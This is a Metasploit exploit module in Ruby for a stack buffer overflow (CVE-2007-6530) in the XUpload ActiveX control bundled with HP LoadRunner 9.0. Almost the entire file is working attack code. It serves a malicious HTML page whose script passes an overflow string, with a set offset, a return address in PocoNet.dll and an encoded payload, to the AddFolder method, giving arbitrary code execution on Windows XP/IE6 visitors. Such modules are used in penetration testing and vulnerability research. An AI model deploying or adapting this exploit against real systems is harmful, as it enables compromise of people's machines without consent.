##
# $Id: hp_loadrunner_addfolder.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP LoadRunner 9.0 ActiveX AddFolder Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Persits Software Inc's
				XUpload ActiveX control(version 2.1.0.1) thats included in HP LoadRunner 9.0.
				By passing an overly long string to the AddFolder method, an attacker may be
				able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2007-6530'],
					[ 'OSVDB', '39901'],
					[ 'BID', '27025' ],
					[ 'URL', 'http://lists.grok.org.uk/pipermail/full-disclosure/2007-December/059296.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 800,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP2 Pro English / IE6SP0-SP2',     { 'Offset' => 1388, 'Ret' => 0x323ad95f } ], # PocoNet.dll
				],
			'DisclosureDate' => 'Dec 25 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	= rand_text_alpha(rand(100) + 1)
		strname	= rand_text_alpha(rand(100) + 1)

		# Set the exploit buffer
		sploit =  rand_text_alpha(target['Offset']) + [target.ret].pack('V')
		sploit << p.encoded + rand_text_alpha(1024 - p.encoded.length)

		# Build out the message
		content = %Q|<html>
<object classid='clsid:E87F6C8E-16C0-11D3-BEF7-009027438003' id='#{vname}'></object>
<script language='javascript'>
#{strname} = new String('#{sploit}')
#{vname}.AddFolder(#{strname});
</script>
</html>
|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
